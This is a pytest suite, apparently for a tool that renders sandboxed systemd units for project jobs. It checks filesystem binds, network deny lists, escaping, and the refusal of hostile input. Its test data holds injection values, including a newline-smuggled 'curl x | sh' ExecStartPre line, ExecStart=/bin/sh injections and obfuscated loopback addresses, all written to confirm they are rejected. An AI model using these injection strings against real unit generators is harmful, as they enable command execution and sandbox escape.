    assert f'"MES_ROOT={ROOT}"' in values(ui, "Environment")  # how easy-ui finds the server layout
    assert f'"MES_ROOT={ROOT}"' in values(files["mes-demo.gate-publish@.service"], "Environment")
    assert not any("EASYUI_STATE_HOME" in t for t in files.values())


def test_quotes_percent_and_dollar_in_run_lines(files):
    build = files["mes-demo.job.demo-app.build.service"]
    start = one(build, "ExecStart")
    assert '"50%% done" "$$HOME"' in start
    assert split_exec(start)[-2:] == ["50% done", "$HOME"]


def test_timer_and_webhook_path(files, layout):
    timer = files["mes-demo.job.demo-app.sync.timer"]
    assert one(timer, "OnCalendar") == "*-*-* 06:00:00"
    assert one(timer, "Persistent") == "true"
    assert one(timer, "RandomizedDelaySec") == str(units.RANDOM_DELAY_SEC)
    assert one(timer, "Unit") == "mes-demo.job.demo-app.sync.service"
    assert one(timer, "WantedBy") == "timers.target"
    path = files["mes-demo.job.demo-app.hook.path"]
    assert one(path, "PathModified") == f"{layout.triggers}/demo-app.hook"
    assert one(path, "Unit") == "mes-demo.job.demo-app.hook.service"
    for name in ("mes-demo.job.demo-app.export.service", "mes-demo.job.demo-app.build.service"):
        assert name.replace(".service", ".timer") not in files


def test_webhook_receiver(files, layout):
    sock = files["mes-demo.webhook.socket"]
    assert one(sock, "ListenStream") == "/run/mes-demo-webhook.sock"
    assert one(sock, "SocketUser") == "root" and one(sock, "SocketMode") == "0600"
    assert one(sock, "Accept") == "no"
    svc = files["mes-demo.webhook.service"]
    assert split_exec(one(svc, "ExecStart")) == [MES, "webhook", "serve", "--project", "demo", "--server-root", ROOT]
    # Finding 10: it sees etc/ (the root-owned job list and secret) and its own folder, never code/.
    assert one(svc, "ReadWritePaths") == str(layout.webhook)
    assert str(layout.etc) in values(svc, "BindReadOnlyPaths")
    assert str(layout.code) not in svc and str(layout.data) + " " not in svc


@pytest.mark.parametrize("level", units.SANDBOX_LEVELS)
def test_gate_instances(files, layout, level):
    sock = files[f"mes-demo.gate-{level}.socket"]
    assert one(sock, "ListenStream") == units.gate_socket_path("demo", level) == f"/run/mes-demo-gate/{level}.sock"
    assert one(sock, "SocketUser") == "mes-demo" and one(sock, "SocketGroup") == "mes-demo"
    assert one(sock, "SocketMode") == "0600" and one(sock, "Accept") == "yes"
    svc = files[f"mes-demo.gate-{level}@.service"]
    assert split_exec(one(svc, "ExecStart")) == [
        MES, "gate", "child", "--project", "demo", "--server-root", ROOT, "--level", level]
    assert one(svc, "StandardInput") == "socket" and one(svc, "StandardOutput") == "socket"
    hidden = " ".join(values(svc, "InaccessiblePaths")).split()
    assert {f"-{layout.webhook_key}", f"-{layout.incoming}"} <= set(hidden)
    assert "/run:ro" in one(svc, "TemporaryFileSystem").split()  # the gate's own sockets are not there
    rw = values(svc, "ReadWritePaths")
    if level == "read":
        assert rw == []
    elif level == "write":
        assert rw == [f"{layout.data} {layout.state} {layout.store}"]
    elif level == "publish":
        assert rw == [str(layout.ui)]
        assert one(svc, "PrivateNetwork") == "yes" and one(svc, "UMask") == "0027"
    else:
        assert rw == []
        assert one(svc, "BindPaths") == f"-{layout.uv_cache} -{layout.uv_python} -{layout.installing}"
        assert values(svc, "PrivateNetwork") == []  # uv sync needs the package index
        assert one(svc, "RuntimeMaxSec") == "1800"
    assert one(files[f"mes-demo.gate-{level}.socket"], "MaxConnections") == \
        ("1" if level in ("deploy", "publish") else "4")


def test_the_install_step_sees_no_data_and_only_the_new_release_writable(files, layout):
    """Finding A1/A2: the internet-facing deploy sandbox could write every release, ui/ and read
    data/ (login tokens). Now it binds no data, state, store, ui or gate, and of code/ only uv's
    folders and the link code/installing (the release being installed) are writable."""
    svc = files["mes-demo.gate-deploy@.service"]
    shown = " ".join(values(svc, "BindPaths") + values(svc, "BindReadOnlyPaths"))
    for folder in (layout.data, layout.state, layout.store, layout.ui, layout.gate, layout.auth, layout.webhook):
        assert str(folder) not in shown, folder
    assert f"{layout.etc} {layout.code}" in values(svc, "BindReadOnlyPaths")
    assert values(svc, "ReadWritePaths") == []
    assert '"MES_ROOT=/var/lib/mes"' not in values(svc, "Environment")  # it publishes nothing
    pub = files["mes-demo.gate-publish@.service"]
    shown = " ".join(values(pub, "BindPaths") + values(pub, "BindReadOnlyPaths"))
    assert str(layout.data) not in shown and str(layout.state) not in shown
    assert one(pub, "IPAddressDeny") == "any" and one(pub, "RestrictAddressFamilies") == "AF_UNIX"


def test_deploy_sandbox_tools_are_out_of_reach_of_jobs(files, layout):
    """Finding 6: uv's cache and Python lived in state/, which jobs and the write key can change."""
    svc = files["mes-demo.gate-deploy@.service"]
    env = values(svc, "Environment")
    assert f'"UV_CACHE_DIR={layout.code}/uv-cache"' in env
    assert f'"UV_PYTHON_INSTALL_DIR={layout.code}/uv-python"' in env
    assert '"UV_NO_CONFIG=1"' in env and '"UV_LINK_MODE=copy"' in env and '"HOME=/nonexistent"' in env
    assert not any(str(layout.state) in e for e in env if e.startswith(('"UV_', '"HOME')))


def test_deploy_sandbox_cannot_reach_this_computer_or_the_local_network(files):
    """Finding 8: uv sync ran with unrestricted network. systemd's own sets cover this computer
    (localhost), link-local and multicast in IPv4 and IPv6; private, Tailscale (CGNAT) and
    unique-local ranges are listed. What cannot be known when rendering is said plainly."""
    text = files["mes-demo.gate-deploy@.service"]
    deny = one(text, "IPAddressDeny").split()
    for net in ("localhost", "link-local", "multicast", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
                "100.64.0.0/10", "fc00::/7", "fec0::/10", "0.0.0.0/8", "240.0.0.0/4", "::/128"):
        assert net in deny, net
    assert values(text, "IPAddressAllow") == []
    assert "# Not covered: this server's own public addresses and the global IPv6 addresses of other machines on" \
        in text.split("\n")
    import ipaddress

    nets = [ipaddress.ip_network(n) for n in deny if "/" in n]
    for addr in ("127.0.0.1", "10.1.2.3", "100.100.100.100", "192.168.1.1", "169.254.169.254", "fd7a:115c:a1e0::1"):
        a = ipaddress.ip_address(addr)
        assert any(a in n for n in nets) or a.is_loopback or a.is_link_local, addr


def test_server_builds_get_no_shared_cache_or_python(project, layout):
    """--allow-server-builds: package build code runs in the install step, so the shared
    code/uv-cache and code/uv-python must not be writable there (nor visible): uv's cache and
    Python are folders of the release being installed."""
    plain = units.render_gate(project, layout=layout, mes=MES)["mes-demo.gate-deploy@.service"]
    built = units.render_gate(project, layout=layout, mes=MES, allow_builds=True)["mes-demo.gate-deploy@.service"]
    assert {str(layout.uv_cache), str(layout.uv_python)} <= set(_writable(plain))
    assert _writable(built) == [str(layout.installing)]
    hidden = " ".join(values(built, "InaccessiblePaths")).split()
    assert f"-{layout.uv_cache}" in hidden and f"-{layout.uv_python}" in hidden
    env = values(built, "Environment")
    own = f"{layout.installing}/{units.INSTALL_UV_DIR}"
    assert f'"UV_CACHE_DIR={own}/cache"' in env and f'"UV_PYTHON_INSTALL_DIR={own}/python"' in env
    assert not any(str(layout.uv_cache) in e or str(layout.uv_python) in e for e in env)
    # The plan, its fingerprint and the deploy's 'units changed' check all render the same thing.
    from mes import deploy

    rendered = units.render_project(project, layout=layout, mes=MES, allow_builds=True)
    assert rendered["mes-demo.gate-deploy@.service"] == built
    assert deploy.units_fingerprint(project, layout, MES, None, allow_builds=True) != \
        deploy.units_fingerprint(project, layout, MES, None)


# Each deploy step's sandbox: what it may read and write of the server folder and its network.
# A change that widens one of them must change this table on purpose.
DEPLOY_STEPS = {
    # The install step: uv and mes's wheel unpacker, the package index.
    "mes-demo.gate-deploy@.service": {
        "read": {"etc", "code"}, "write": {"code/uv-cache", "code/uv-python", "code/installing"},
        "network": "internet without this computer or the local network"},
    # The describe step (a read request): the apps describe themselves, no network.
    "mes-demo.gate-read@.service": {"read": {"code", "data", "state", "store"}, "write": set(), "network": "none"},
    # The publish step: easy-ui writes ui/, no network.
    "mes-demo.gate-publish@.service": {"read": {"etc", "code"}, "write": {"ui"}, "network": "none"},
}


def _server_parts(text: str, layout, key: str) -> set[str]:
    base = str(layout.base) + "/"
    out = set()
    for v in values(text, key):
        for w in v.split():
            src = w.lstrip("-").split(":")[0]
            if src.startswith(base):
                out.add(src[len(base):])
            elif src not in ("/opt/mes", "/usr/local/bin", "/usr/local/lib", "/usr/local/lib64", units.RESOLVE_SOCKET):
                out.add(src)
    return out


def _network(text: str) -> str:
    if values(text, "PrivateNetwork") == ["yes"] and one(text, "IPAddressDeny") == "any" \
            and one(text, "RestrictAddressFamilies") == "AF_UNIX":
        return "none"
    if values(text, "PrivateNetwork") == [] and one(text, "IPAddressDeny") == " ".join(units.DEPLOY_DENY) \
            and one(text, "RestrictAddressFamilies") == "AF_UNIX AF_INET AF_INET6" and not values(text, "IPAddressAllow"):
        return "internet without this computer or the local network"
    return "something else"


@pytest.mark.parametrize("name", sorted(DEPLOY_STEPS))
def test_each_deploy_step_has_exactly_the_access_it_needs(files, layout, name):
    """The deploy end-to-end test runs every step in-process, without the sandboxes; this checks
    the rendered units of those steps instead: readable, writable and network, nothing more."""
    want = DEPLOY_STEPS[name]
    text = files[name]
    write = _server_parts(text, layout, "BindPaths") | _server_parts(text, layout, "ReadWritePaths")
    read = _server_parts(text, layout, "BindReadOnlyPaths")
    assert write == want["write"], name
    assert read == want["read"], name
    assert _network(text) == want["network"], name
    runs = [b for b in " ".join(values(text, "BindReadOnlyPaths")).split() if units.RESOLVE_SOCKET in b]
    assert bool(runs) == (want["network"] != "none"), name  # names only for the step with the internet
    # Secrets inside what it sees stay hidden.
    hidden = " ".join(values(text, "InaccessiblePaths")).split()
    assert f"-{layout.webhook_key}" in hidden and f"-{layout.incoming}" in hidden
    if name != "mes-demo.gate-deploy@.service":
        assert f"-{layout.uv_cache}" in hidden


def test_temporary_exit_is_skipped_and_stops_the_chain(files):
    """Finding H: exit code 75 counted as a failure; now it is a success for systemd (so
    'systemctl --failed' stays meaningful) and root skips what waits for it."""
    for name, text in files.items():
        if ".job." in name and name.endswith(".service"):
            assert one(text, "SuccessExitStatus") == "75", name
    build = files["mes-demo.job.demo-app.build.service"]  # after = "sync"
    cond = one(build, "ExecCondition")
    assert cond.startswith("+")
    assert split_exec(cond) == [*units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "should-run",
                                "--project", "demo", "--server-root", ROOT, "--", "demo-app.sync"]
    report = files["mes-demo.job.demo-tool.report.service"]
    assert split_exec(one(report, "ExecCondition"))[-1] == "demo-app.build"
    assert values(files["mes-demo.job.demo-app.sync.service"], "ExecCondition") == []  # scheduled, no upstream
    ui = files["mes-demo.ui-refresh.service"]
    assert split_exec(one(ui, "ExecCondition"))[-2:] == ["--", "demo-app.build"]


def test_dashboard_refresh_publishes_the_first_time(files, layout):
    """Finding E: the first deploy cannot publish (no data yet); the refresh after the first data
    publishes when nothing is published, as the project's account in the same sandbox."""
    ui = files["mes-demo.ui-refresh.service"]
    post = one(ui, "ExecStartPost")
    assert not post.startswith("+")
    argv = split_exec(post)
    assert argv[:4] == list(units.ROOT_ENV) and "HOME=/nonexistent" in argv and "MES_ROOT=/var/lib/mes" in argv
    i = argv.index(units.DEFAULT_MES_PYTHON)
    assert argv[i:] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "server", "first-publish", "demo",
                        "--server-root", ROOT, "--easy-ui", EASY_UI]


def test_every_job_has_its_own_name_service(files, layout):
    """A job that listed hosts got its own /etc/hosts but the server's nsswitch.conf and
    resolv.conf: glibc read the hosts file, but c-ares (curl_cffi) read those two files itself,
    asked DNS first and gave up with a timeout. Every job unit (and every probe) now binds the
    project's etc/nsswitch.conf ('hosts: files') and etc/resolv.conf (no server), required (no '-'),
    so a unit without them does not start."""
    jobs_ = {n: t for n, t in files.items() if _is_project_code(n) and (".job." in n or n.endswith(PROBES))}
    assert len(jobs_) == 8
    want = [f"{layout.nsswitch}:/etc/nsswitch.conf", f"{layout.resolv_conf}:/etc/resolv.conf"]
    for name, text in jobs_.items():
        binds = " ".join(values(text, "BindReadOnlyPaths")).split()
        assert all(w in binds for w in want), name
    # Units that are not jobs keep the system's (the install step needs resolved's socket).
    for name in ("mes-demo.gate-deploy@.service", "mes-demo.webhook.service", "mes-demo.ui-refresh.service"):
        assert str(layout.nsswitch) not in files[name], name
    lines = units.JOB_NSSWITCH.splitlines()
    entries = {ln.split(":")[0]: ln.split(":", 1)[1].split() for ln in lines if ln and not ln.startswith("#")}
    assert entries["hosts"] == ["files"] and entries["passwd"] == entries["group"] == ["files"]
    assert all(v == ["files"] for v in entries.values())  # no systemd, resolve, mymachines, dns, ...
    assert not any(":" in ln for ln in lines if ln.startswith("#"))
    assert all(ln.startswith("#") for ln in units.JOB_RESOLV_CONF.splitlines())  # no "nameserver"
    assert units.name_service_files(layout) == {str(layout.nsswitch): units.JOB_NSSWITCH,
                                                str(layout.resolv_conf): units.JOB_RESOLV_CONF}


def test_selftest_net_probe_is_rendered_like_a_job_with_hosts(files, layout):
    """Finding G: the self-test never probed the sandbox real jobs with network = [...] get."""
    net = files["mes-demo.selftest-net.service"]
    sync = files["mes-demo.job.demo-app.sync.service"]
    for key in ("RestrictAddressFamilies", "IPAddressDeny", "TemporaryFileSystem", "InaccessiblePaths"):
        assert values(net, key) == values(sync, key), key
    assert values(net, "PrivateNetwork") == []
    assert f"{units.selftest_hosts_file('demo')}:/etc/hosts" in values(net, "BindReadOnlyPaths")
    assert one(net, "Requires") == one(net, "After") == "mes-demo.net.selftest.service"
    assert split_exec(one(net, "ExecStart"))[-4:] == ["--context", "net", "--server-root", ROOT]
    helper = files["mes-demo.net.selftest.service"]
    assert split_exec(one(helper, "ExecStart"))[-8:] == [
        "allow-network", "--selftest", "--unit", "mes-demo.selftest-net.service", "--hosts-file",
        "/run/mes-demo-net/selftest/hosts", "--", units.SELFTEST_HOST]
    assert one(helper, "Before") == "mes-demo.selftest-net.service" and values(helper, "User") == []
    path = files["mes-demo.selftest-net.path"]
    assert one(path, "PathModified") == f"{layout.gate}/selftest-net-request"
    import ipaddress

    assert not ipaddress.ip_address(units.SELFTEST_ADDRESS).is_global  # documentation range: leads nowhere


def test_run_as_prints_a_sandboxed_systemd_run(tmp_path, layout):
    """Item J: interactive app commands (a login) run as the project's account in a transient
    sandboxed unit; mes only prints the command."""
    p = _demo_project(tmp_path)
    cmd = units.interactive_command(p, layout, ["demo-app", "login", "--user", "me"])
    assert cmd[:2] == ["systemd-run", "--pty"] and f"--slice={units.SLICE}" in cmd
    props = [cmd[i + 1] for i, w in enumerate(cmd) if w == "-p"]
    assert "User=mes-demo" in props and f"BindReadOnlyPaths={layout.code}" in props
    assert f"BindPaths={layout.data} {layout.store} {layout.state}" in props
    assert cmd[cmd.index("--") + 1:] == [f"{layout.current_project}/.venv/bin/demo-app", "login", "--user", "me"]
    # No network by default, and no resolver socket: not even local or tailnet names can be looked up.
    assert "PrivateNetwork=yes" in props and "IPAddressDeny=any" in props
    assert not any(units.RESOLVE_SOCKET in x for x in props)
    anyhost = units.interactive_command(p, layout, ["demo-app", "login"], network="any")
    aprops = [anyhost[i + 1] for i, w in enumerate(anyhost) if w == "-p"]
    assert "IPAddressDeny=" + " ".join(units.DEPLOY_DENY) in aprops and "PrivateNetwork=yes" not in aprops
    hosts = units.interactive_command(p, layout, ["demo-app", "login"], network="hosts", addresses=["93.184.216.34"])
    hprops = [hosts[i + 1] for i, w in enumerate(hosts) if w == "-p"]
    assert "IPAddressDeny=any" in hprops and "IPAddressAllow=93.184.216.34" in hprops
    # Like a job that lists hosts: its own hosts file and name service, no resolver socket (c-ares
    # would ask DNS first there and fail), no unix sockets.
    assert not any(units.RESOLVE_SOCKET in x for x in hprops)
    assert f"BindReadOnlyPaths={units.run_as_hosts_file('demo')}:/etc/hosts" in hprops
    assert units.name_service_binds(layout) in hprops and "RestrictAddressFamilies=AF_INET AF_INET6" in hprops
    assert units.name_service_binds(layout) in props  # no network: the same name service
    assert units.name_service_binds(layout) not in aprops  # the whole internet: the system's, through resolved
    with pytest.raises(Refused):
        units.interactive_command(p, layout, ["demo-app", "login"], network="hosts", addresses=["192.168.1.5"])
    with pytest.raises(StopIteration):
        units.interactive_command(p, layout, ["not-an-app", "x"])


def test_selftest_probe_has_a_jobs_sandbox(files, layout):
    svc = files["mes-demo.selftest.service"]
    assert one(svc, "PrivateNetwork") == "yes" and one(svc, "User") == "mes-demo"
    assert split_exec(one(svc, "ExecStart")) == [MES, "server", "selftest-probe", "demo", "--context", "job",
                                                 "--server-root", ROOT]
    assert values(svc, "ExecStopPost") == [] and values(svc, "ExecStartPre") == []
    # Its run is recorded like a job's, and it starts the probe of a job that waits for another.
    assert one(svc, "OnSuccess") == "mes-demo.record.selftest.service mes-demo.selftest-after.service"
    assert one(svc, "OnFailure") == "mes-demo.record.selftest.service"
    rec = files["mes-demo.record.selftest.service"]
    assert split_exec(one(rec, "ExecStart"))[-6:] == ["record", "--project", "demo", "--server-root", ROOT, "--selftest"]
    assert one(rec, "After") == "mes-demo.selftest.service"
    after = files["mes-demo.selftest-after.service"]
    report = files["mes-demo.job.demo-tool.report.service"]  # a real job that waits for another
    for key in ("TemporaryFileSystem", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
                "IPAddressDeny", "User"):
        assert values(after, key) == values(report, key), key
    assert units.CONTROL_SOCKET in values(after, "BindReadOnlyPaths")
    assert split_exec(one(after, "ExecCondition"))[-6:] == [
        "should-run", "--project", "demo", "--server-root", ROOT, "--selftest"]
    assert split_exec(one(after, "ExecStart"))[-4:] == ["--context", "after", "--server-root", ROOT]
    assert one(after, "After") == "mes-demo.selftest.service"
    path = files["mes-demo.selftest.path"]
    assert one(path, "PathModified") == f"{layout.gate}/selftest-request"
    assert one(path, "Unit") == "mes-demo.selftest.service"


ONE_JOB = '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'


def test_project_without_ui_or_webhook_has_no_such_units(layout, tmp_path):
    p = helpers.load(tmp_path / "a", '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    names = units.render_project(p, layout=layout, mes=MES, easy_ui=EASY_UI)
    assert not any("webhook" in n or "ui-refresh" in n or ".timer" in n for n in names)
    assert "mes-demo.job.demo-x.x.service" in names
    # [ui] without refresh_after, or no easy-ui on the server: no refresh unit.
    p2 = helpers.load(tmp_path / "b", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = []\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p2, layout=layout, mes=MES, easy_ui=EASY_UI)
    p3 = helpers.load(tmp_path / "c", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = ["demo-x.x"]\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p3, layout=layout, mes=MES)


def test_two_projects_never_share_a_unit_name(layout, tmp_path):
    a = helpers.load(tmp_path / "a", '[project]\nname = "fit"\napps = ["fit_data"]\n',
                     {"fit_data": '[app]\nname = "fit-data"\ncommand = "fd"\n[jobs.sync]\nrun = "x"\nmanual = true\n'})
    b = helpers.load(tmp_path / "b", '[project]\nname = "fit-data"\napps = ["fd_sync"]\n',
                     {"fd_sync": '[app]\nname = "fd-sync"\ncommand = "fd"\n[jobs.x]\nrun = "x"\nmanual = true\n'})
    na = set(units.render_project(a, layout=paths.server_layout("fit", ROOT), mes=MES))
    nb = set(units.render_project(b, layout=paths.server_layout("fit-data", ROOT), mes=MES))
    assert not na & nb


def test_old_unit_name_forms_are_not_job_units():
    assert not units.JOB_UNIT_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.net.sync.service")
    m = units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    assert m and (m["project"], m["app"], m["job"]) == ("demo", "demo-app", "sync")


# =========================================================================== escaping helpers


def test_escaping_helpers():
    assert units.quote_exec_word('a\\"b') == '"a\\\\\\"b"'
    assert units.quote_exec_word("50% $x") == '"50%% $$x"'
    assert units.env_assignment("MES_JOB", 'x"%') == '"MES_JOB=x\\"%%"'
    assert units.exec_line(["/bin/x", "a b"]) == '"/bin/x" "a b"'
    with pytest.raises(Refused):
        units.exec_line(["x"])
    with pytest.raises(Refused):
        units.quote_exec_word(";")
    with pytest.raises(Refused):
        units.env_assignment("lower", "x")
    for bad in ("a\nb", "a\rb", "a\x00b", "a\x85b", "a b", "a\x7fb"):
        with pytest.raises(Refused):
            units.quote_exec_word(bad)


@pytest.mark.parametrize("path", ["relative", "/a/../b", "/a//b", "/a/./b", "/a b", "/a\nb", "/a%b",
                                  '/a"b', "/a\\b", "/a$b", "/a;b"])
def test_sandbox_path_refuses(path):
    with pytest.raises(Refused):
        units.sandbox_path(path)


@pytest.mark.parametrize("tool", ["/tmp/mes", "/var/tmp/mes", "/home/u/.local/bin/mes", "/root/mes",
                                  "/run/user/1000/mes", "/dev/shm/mes", "mes", "/opt/my mes"])
def test_tool_paths_outside_admin_folders_are_refused(project, layout, tool):
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=tool, easy_ui=EASY_UI)
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=MES, easy_ui=tool)
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=MES, mes_python=tool)


# =========================================================================== hostile values


HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"


def _job(**kw):
    base = dict(id="demo-app.x", name="x", run="ok", app="demo-app", argv=("ok",), trigger="manual")
    base.update(kw)
    return Job(**base)


def _project(job=None, name="demo", apps=None, ui=None):
    jobs = {job.id: job} if job is not None else {}
    return Project(name=name, title="t", version="1", apps=apps or {"demo-app": helpers.spec("demo-app")},
                   jobs=jobs, ui=ui)


@pytest.mark.parametrize("job", [
    _job(id=HOSTILE),
    _job(id="demo-app.x\n[Service]"),
    _job(id="demo-app.X"),
    _job(id="demo-app.x.y"),
    _job(id="x"),
    _job(id="demo-app.x\nExecStart=/bin/sh"),
    _job(argv=("ok", HOSTILE)),
    _job(argv=("ok", "a\rb")),
    _job(argv=("ok", ";")),
    _job(argv=("ok", "x\x00y")),
    _job(argv=("ok\nExecStart=/bin/sh",)),
    _job(trigger="schedule", schedule="daily\nExecStart=/bin/sh"),
    _job(trigger="schedule", schedule="daily %h"),
    _job(trigger="schedule", schedule="daily;reboot"),
    _job(memory="256M\nMemoryMax=infinity"),
    _job(memory="infinity"),
    _job(memory="0M"),
    _job(timeout="15m\nTimeoutStartSec=0"),
    _job(timeout="0s"),
    _job(timeout="infinity"),
    _job(network=("api.example.com\nPrivateNetwork=no",)),
    _job(network=("evil host",)),
    _job(network=("0.0.0.0/0",)),
    _job(network=("0x7f.0.0.1",)),
    _job(network=("0x7f.1",)),
    _job(network=("2130706433",)),
    _job(local_network=("127.1",)),
    _job(writes=("data", "/etc")),
    _job(writes=("code",)),
])
def test_hostile_job_values_are_refused(job, layout):
    with pytest.raises(Refused) as e:
        units.render_project(_project(job), layout=layout, mes=MES, easy_ui=EASY_UI)
    assert e.value.code == "unsafe_unit_value"
    assert e.value.exit_code == 5


@pytest.mark.parametrize("name", ["demo\nExecStart=/bin/sh", "Demo", "../etc", "a", "demo.job", "demo x",
                                  "demo/x", "-demo", "x" * 40])
def test_hostile_project_name_refused(name, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), name=name), layout=layout, mes=MES)
    with pytest.raises(Refused):
        units.job_unit(name, "demo-app.x")
    with pytest.raises(Refused):
        units.gate_socket_path(name, "read")


@pytest.mark.parametrize("cli", ["demo\nExecStart=/bin/sh", "../../bin/sh", "/bin/sh", "de mo"])
def test_hostile_app_program_refused(cli, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), apps={"demo-app": helpers.spec("demo-app", cli)}), layout=layout,
                             mes=MES)


@pytest.mark.parametrize("root", ["/srv/my mes", "/srv/mes\nExecStart=/bin/sh", "relative", "/srv/../etc",
                                  "/srv/50%", '/srv/"x', "/srv/a\\b", "/srv/$HOME"])
def test_hostile_server_root_refused(root):
    layout = paths.server_layout("demo", root)
    with pytest.raises(Refused):
        units.render_project(_project(_job()), layout=layout, mes=MES)


def test_hostile_value_in_one_job_renders_nothing(layout, tmp_path):
    p = helpers.load(tmp_path, '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    bad = _job(id="demo-x.b", name="b", app="demo-x", argv=("ok", HOSTILE))
    p = Project(name=p.name, title=p.title, version=p.version, apps=p.apps, jobs={**p.jobs, "demo-x.b": bad})
    with pytest.raises(Refused):
        units.render_project(p, layout=layout, mes=MES)


def test_manifest_rejects_hostile_names_before_rendering():
    from mes.errors import MesError
    from mes.manifest import loads, loads_app

    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')
    with pytest.raises(MesError):
        loads('[project]\nname = "demo\\nUser=root"\napps = ["a_b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs.x]\nrun = "ok"\nmanual = true\nnetwork = ["a b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x\\nExecStart=/bin/sh"\n')


def test_ui_refresh_needs_safe_easy_ui(layout):
    p = _project(_job(), ui=UI(refresh_after=("demo-app.x",)))
    with pytest.raises(Refused):
        units.render_ui_refresh(p, layout=layout, easy_ui="/tmp/easy-ui")
    text = units.render_ui_refresh(p, layout=layout, easy_ui=EASY_UI)
    directives(text)


def test_unit_name_patterns():
    assert units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    for bad in ("mes-demo.net.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer",
                "mes-demo.job.demo-app.sync.service\n", "mes-Demo.job.demo-app.sync.service",
                "mes-demo.job..service", "mes-demo.job.sync.service", "mes-demo.job.a.b.c.service"):
        assert not units.JOB_UNIT_RE.fullmatch(bad)
    with pytest.raises(ValueError):
        units.job_unit("demo", "x", "socket")
    with pytest.raises(ValueError):
        units.gate_units("demo", "admin")
